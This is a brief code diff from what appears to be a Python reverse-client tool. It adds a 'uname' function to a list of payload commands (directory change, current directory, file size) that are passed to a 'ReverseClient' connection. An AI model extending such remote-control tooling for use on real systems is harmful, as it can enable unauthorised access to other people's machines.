@@ -97,6 +97,7 @@ if __name__ == '__main__':
             payload.change_dir,
             payload.get_current_dir,
             payload.get_file_size,
+            payload.uname,
     ]
 
     with ReverseClient(addr) as client:
